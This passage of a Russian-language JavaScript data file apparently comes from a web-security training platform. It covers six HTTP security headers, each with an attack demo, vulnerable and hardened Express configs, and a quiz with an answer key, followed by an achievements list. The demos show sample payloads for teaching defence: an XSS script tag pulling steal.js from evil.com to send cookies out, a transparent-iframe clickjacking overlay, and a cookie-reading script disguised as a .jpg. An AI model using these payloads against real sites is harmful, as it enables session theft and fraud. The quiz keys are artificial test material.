      'CSP — самый мощный HTTP-заголовок для защиты от XSS. Он определяет, откуда браузер может загружать скрипты, стили, изображения, шрифты и другие ресурсы. Правильно настроенный CSP блокирует выполнение inline-скриптов и загрузку ресурсов с неавторизованных доменов.',
    attackDemo:
      'Без CSP злоумышленник внедряет <script src="https://evil.com/steal.js"></script> через XSS. Браузер выполняет скрипт, который отправляет cookies на сервер злоумышленника. С CSP «script-src \'self\'» — браузер блокирует загрузку внешнего скрипта.',
    vulnerableConfig: `// Нет CSP — браузер загружает скрипты отовсюду
app.use((req, res, next) => {
  // Никаких ограничений на источники ресурсов
  next();
});

// Злоумышленник может:
// 1. Загрузить скрипт с любого CDN
// 2. Выполнить inline-скрипт <script>alert(1)</script>
// 3. Подключить iframe с фишинговым сайтом`,
    secureConfig: `// Строгий CSP через helmet
app.use(helmet.contentSecurityPolicy({
  directives: {
    defaultSrc: ["'self'"],
    scriptSrc: ["'self'"],                    // Только свой домен
    styleSrc: ["'self'", "'unsafe-inline'"],  // Свой + inline стили
    imgSrc: ["'self'", 'data:', 'https:'],    // Свой + data + HTTPS
    fontSrc: ["'self'", 'https://fonts.gstatic.com'],
    frameSrc: ["'none'"],                     // Запрет iframe
    objectSrc: ["'none'"],                    // Запрет flash/object
    upgradeInsecureRequests: [],              // HTTP → HTTPS
  }
}));`,
    quiz: {
      question: 'Какая CSP-директива блокирует все inline-скрипты?',
      options: ["script-src 'unsafe-inline'", "script-src 'self'", "default-src *", "script-src 'none'"],
      correctIndex: 1,
      explanation: "script-src 'self' разрешает загрузку скриптов только с текущего домена. Inline-скрипты (<script>тег</script>) и обработчики событий (onclick) блокируются. Для разрешения конкретного inline-скрипта нужен nonce или hash.",
    },
  },
  {
    id: 'hsts',
    name: 'Strict-Transport-Security',
    category: 'Защита соединения',
    description:
      'HSTS заставляет браузер всегда использовать HTTPS для данного домена, даже если пользователь вводит http://. Это предотвращает downgrade-атаки (SSL stripping), при которых злоумышленник на уровне сети конвертирует HTTPS-соединение в HTTP.',
    attackDemo:
      'Без HSTS: пользователь вводит http://bank.com. MITM-атакующий (через публичный Wi-Fi) перехватывает запрос и не перенаправляет на HTTPS. Пароль передаётся в открытом виде. С HSTS: браузер помнит, что bank.com всегда HTTPS, и автоматически использует защищённое соединение.',
    vulnerableConfig: `// Нет HSTS
app.use((req, res, next) => {
  // Пользователи могут зайти по HTTP
  // Нет принудительного редиректа на HTTPS
  next();
});

// Атака SSL Strip:
// 1. Пользователь: http://bank.com
// 2. Атакующий: перехватывает, не редиректит
// 3. Пароль передаётся открытым текстом`,
    secureConfig: `// HSTS через helmet
app.use(helmet.hsts({
  maxAge: 31536000,       // 1 год (в секундах)
  includeSubDomains: true, // Все поддомены тоже HTTPS
  preload: true           // Включить в HSTS preload list браузера
}));

// Или вручную:
res.setHeader(
  'Strict-Transport-Security',
  'max-age=31536000; includeSubDomains; preload'
);

// Редирект HTTP → HTTPS
app.use((req, res, next) => {
  if (req.protocol === 'http') {
    res.redirect(301, 'https://' + req.get('host') + req.url);
  } else {
    next();
  }
});`,
    quiz: {
      question: 'Что делает директива preload в HSTS?',
      options: [
        'Предзагружает SSL-сертификат',
        'Добавляет домен в встроенный список HSTS браузеров',
        'Ускоряет HTTPS-соединение',
        'Включает HSTS только для поддоменов',
      ],
      correctIndex: 1,
      explanation: 'preload добавляет домен в HSTS Preload List — список, встроенный в браузеры (Chrome, Firefox, Safari). Даже первый визит на сайт будет через HTTPS, без необходимости сначала получить HSTS-заголовок.',
    },
  },
  {
    id: 'x-frame-options',
    name: 'X-Frame-Options',
    category: 'Защита от кликджекинга',
    description:
      'X-Frame-Options запрещает встраивание страницы в iframe, frame или object. Это защита от clickjacking — атаки, при которой невидимый iframe с целевым сайтом накладывается на видимую страницу, заставляя пользователя нажать на кнопку, которую он не видит.',
    attackDemo:
      'Без X-Frame-Options: злоумышленник создаёт страницу с прозрачным iframe, содержащим bank.com/transfer. Пользователь думает, что нажимает на кнопку «Получить приз», но на самом деле подтверждает перевод денег.',
    vulnerableConfig: `// Нет X-Frame-Options
app.use((req, res, next) => {
  // Любой сайт может встроить вашу страницу в iframe
  next();
});

// Атака clickjacking:
// <iframe src="https://bank.com/transfer"
//         style="opacity:0; position:absolute;
//                top:100px; left:100px;">
// </iframe>
// <button style="position:absolute; top:100px; left:100px;">
//   Получить приз!
// </button>`,
    secureConfig: `// Через helmet
app.use(helmet.frameguard({ action: 'deny' }));

// Или вручную:
res.setHeader('X-Frame-Options', 'DENY');
// SAMEORIGIN — разрешить iframe только с того же домена
// DENY — полностью запретить встраивание

// Современная альтернатива через CSP:
app.use(helmet.contentSecurityPolicy({
  directives: {
    frameAncestors: ["'self'"], // Или 'none'
  }
}));`,
    quiz: {
      question: 'Какое значение X-Frame-Options полностью запрещает встраивание страницы в iframe?',
      options: ['SAMEORIGIN', 'ALLOW-FROM', 'DENY', 'BLOCK'],
      correctIndex: 2,
      explanation: 'DENY полностью запрещает встраивание страницы в iframe. SAMEORIGIN разрешает встраивание только с того же домена. ALLOW-FROM (deprecated) разрешал указание конкретного домена.',
    },
  },
  {
    id: 'x-content-type',
    name: 'X-Content-Type-Options',
    category: 'Защита от MIME-sniffing',
    description:
      'X-Content-Type-Options: nosniff запрещает браузеру определять MIME-тип файла по содержимому. Без этого заголовка браузер может интерпретировать файл с расширением .jpg как JavaScript, если содержимое выглядит как JS-код.',
    attackDemo:
      'Злоумышленник загружает файл avatar.jpg, содержащий: /* это изображение */ alert(document.cookie);. Без nosniff браузер видит JavaScript и выполняет его, несмотря на расширение .jpg. Это называется MIME-type sniffing attack.',
    vulnerableConfig: `// Нет X-Content-Type-Options
app.use(express.static('uploads'));
// Пользователь загружает файл:
// Content-Type: image/jpeg
// Содержимое: <script>alert('XSS')</script>

// Без nosniff:
// - Chrome: определяет по содержимому → исполняет как JS
// - Firefox: определяет по содержимому → исполняет как JS`,
    secureConfig: `// Через helmet
app.use(helmet.noSniff());

// Или вручную:
res.setHeader('X-Content-Type-Options', 'nosniff');

// Также важно: правильная отдача файлов
app.get('/uploads/:filename', (req, res) => {
  res.setHeader('X-Content-Type-Options', 'nosniff');
  res.setHeader('Content-Disposition', 'attachment');
  res.sendFile(path.join(__dirname, 'uploads', req.params.filename));
});`,
    quiz: {
      question: 'Что предотвращает X-Content-Type-Options: nosniff?',
      options: [
        'Загрузку файлов без расширения',
        'Интерпретацию браузером файла как другого MIME-типа',
        'Скачивание вредоносных файлов',
        'Изменение Content-Type сервером',
      ],
      correctIndex: 1,
      explanation: 'nosniff запрещает браузеру «угадывать» MIME-тип по содержимому файла. Браузер будет использовать только заголовок Content-Type, указанный сервером. Это предотвращает атаки, где файл с «безопасным» расширением содержит вредоносный код.',
    },
  },
  {
    id: 'referrer-policy',
    name: 'Referrer-Policy',
    category: 'Защита приватности',
    description:
      'Referrer-Policy контролирует, сколько информации о предыдущей странице передаётся в заголовке Referer при переходе на другой сайт. Это важно для приватности — Referer может содержать sensitive данные (URL с параметрами, токены, поисковые запросы).',
    attackDemo:
      'Без Referrer-Policy: пользователь переходит с bank.com/transfer?token=abc123 на внешний сайт. Заголовок Referer: https://bank.com/transfer?token=abc123 передаётся внешнему серверу, раскрывая токен авторизации.',
    vulnerableConfig: `// Нет Referrer-Policy
// Браузер по умолчанию отправляет полный URL
// Referer: https://myapp.com/dashboard?user_id=123&session=abc

// Внешний сайт видит:
// - user_id пользователя
// - session token
// - путь к странице
// - параметры запроса`,
    secureConfig: `// Через helmet
app.use(helmet.referrerPolicy({
  policy: 'strict-origin-when-cross-origin'
}));

// Или вручную:
res.setHeader('Referrer-Policy', 'strict-origin-when-cross-origin');

// Варианты:
// no-referrer          — никогда не отправлять Referer
// same-origin          — только для того же домена
// strict-origin        — только домен (без пути) для HTTPS→HTTPS
// strict-origin-when-cross-origin — полный URL для same-origin, только домен для cross-origin (рекомендуется)`,
    quiz: {
      question: 'Какое значение Referrer-Policy рекомендуется по умолчанию?',
      options: [
        'no-referrer',
        'unsafe-url',
        'strict-origin-when-cross-origin',
        'same-origin',
      ],
      correctIndex: 2,
      explanation: 'strict-origin-when-cross-origin отправляет полный URL для навигации внутри того же домена, и только домен (без пути и параметров) для кросс-доменных переходов. Это баланс между функциональностью и приватностью.',
    },
  },
  {
    id: 'permissions-policy',
    name: 'Permissions-Policy',
    category: 'Контроль API браузера',
    description:
      'Permissions-Policy ограничивает использование браузерных API (камера, микрофон, геолокация, USB, Bluetooth и др.) для текущего документа и iframe. Замена устаревшего Feature-Policy. Защищает от злоупотребления API браузера через XSS или вредоносные iframe.',
    attackDemo:
      'Без Permissions-Policy: злоумышленник через XSS получает доступ к navigator.geolocation и отслеживает местоположение пользователя. Или использует navigator.mediaDevices.getUserMedia() для доступа к камере/микрофону.',
    vulnerableConfig: `// Нет Permissions-Policy
app.use((req, res, next) => {
  // Все API браузера доступны:
  // - Камера и микрофон
  // - Геолокация
  // - USB-устройства
  // - Bluetooth
  // - Clipboard
  // - Accelerometer, Gyroscope
  next();
});`,
    secureConfig: `// Запретить все неиспользуемые API
res.setHeader('Permissions-Policy', [
  'camera=()',           // Запрет камеры
  'microphone=()',       // Запрет микрофона
  'geolocation=()',      // Запрет геолокации
  'usb=()',              // Запрет USB
  'bluetooth=()',        // Запрет Bluetooth
  'clipboard-read=()',   // Запрет чтения буфера
  'clipboard-write=()',  // Запрет записи в буфер
  'accelerometer=()',    // Запрет акселерометра
  'gyroscope=()',        // Запрет гироскопа
  'payment=(self)',      // Разрешить только для same-origin
].join(', '));

// Разрешить только необходимые:
// Permissions-Policy: geolocation=(self), camera=()`,
    quiz: {
      question: 'Что делает директива camera=() в Permissions-Policy?',
      options: [
        'Разрешает камеру для всех',
        'Запрещает использование камеры',
        'Разрешает камеру только для localhost',
        'Требует HTTPS для камеры',
      ],
      correctIndex: 1,
      explanation: 'camera=() с пустыми скобками означает «ни для кого». Это эквивалент DENY. camera=(self) разрешает только для same-origin. camera=(self https://trusted.com) разрешает для текущего домена и указанного источника.',
    },
  },
];

// ============================================================
// Achievements
// ============================================================
export const achievements = [
  {
    id: 'first-steps',
    title: 'Первые шаги',
    description: 'Завершите свой первый модуль обучения.',
    condition: 'Пройдите любой модуль',
  },
  {
    id: 'sql-master',
    title: 'SQL-мастер',
    description: 'Завершите все задания лаборатории SQL-инъекций.',
    condition: 'Пройдите модуль SQL-инъекции',
  },
  {
    id: 'xss-hunter',
    title: 'Охотник на XSS',
    description: 'Изучите все три типа XSS-атак.',
    condition: 'Пройдите модуль XSS',
  },
  {
    id: 'security-guard',
    title: 'Страж безопасности',
    description: 'Изучите все 10 категорий OWASP Top 10.',
    condition: 'Изучите все пункты OWASP Top 10',
  },
  {
    id: 'auth-expert',
    title: 'Эксперт по аутентификации',
    description: 'Завершите модуль безопасности аутентификации.',
    condition: 'Пройдите модуль Аутентификация',
  },
  {
    id: 'code-reviewer',
    title: 'Код-ревьюер',
    description: 'Завершите все задания безопасного кодирования.',
    condition: 'Пройдите модуль Безопасное кодирование',
  },
  {
    id: 'quiz-master',
    title: 'Мастер квизов',
    description: 'Пройдите квизы в 3 и более категориях.',
    condition: 'Завершите 3 квиза',
  },
  {
    id: 'quiz-perfect',
    title: 'Безупречный результат',
    description: 'Получите 100% в любом квизе.',
    condition: 'Наберите 100% в квизе',
  },
  {
    id: 'crypto-ninja',
    title: 'Криптограф-ниндзя',
    description: 'Завершите модуль инструментов безопасности.',
    condition: 'Пройдите модуль Инструменты',
  },
  {
    id: 'full-completion',
    title: 'Полное прохождение',
    description: 'Завершите все обучающие модули платформы.',
    condition: 'Пройдите все 8 модулей',
  },
  {
    id: 'csrf-shield',
    title: 'Щит от CSRF',
    description: 'Изучите модуль CSRF-атак и механизмы защиты.',
    condition: 'Пройдите модуль CSRF',
  },
  {
    id: 'owasp-half',
    title: 'Полпути к OWASP',
    description: 'Изучите минимум 5 из 10 категорий OWASP Top 10.',
    condition: 'Изучите 5 пунктов OWASP Top 10',
  },
  {
    id: 'quiz-all',
    title: 'Квиз-энциклопедист',
    description: 'Пройдите квизы во всех 7 категориях.',
    condition: 'Завершите 7 квизов',
  },
  {
    id: 'crypto-explorer',
    title: 'Исследователь криптографии',
    description: 'Используйте все инструменты в модуле «Инструменты безопасности».',
    condition: 'Попробуйте все криптографические инструменты',
  },
  {
    id: 'coding-pro',
    title: 'Профессионал код-ревью',
    description: 'Правильно решите минимум 8 из 15 задач безопасного кодирования.',
    condition: 'Решите 8+ задач на безопасное кодирование',
  },
  {
    id: 'headers-guard',
    title: 'Страж заголовков',
    description: 'Изучите все 6 Security Headers и правильно ответьте на квизы.',
    condition: 'Пройдите модуль Security Headers',
  },
];
